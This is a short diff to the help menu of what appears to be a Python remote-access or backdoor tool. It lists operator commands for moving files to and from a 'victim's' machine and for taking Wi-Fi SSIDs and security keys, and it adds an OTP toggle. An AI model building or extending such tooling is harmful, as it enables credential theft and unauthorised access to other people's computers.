@@ -210,6 +210,7 @@ while True:
         \r  /sendfile                  Sends a file from the files directory in the victom's CWD directory.
         \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
         \r  /getwifi                   Gets SSIDs and security keys from victim's PC.
+        \r  /OTP                       Allows you to enable or disable OTP
         \r  /clear                     Clear screen.
         \r  /exit/quit/q               Close session and exit.
         {END}''')
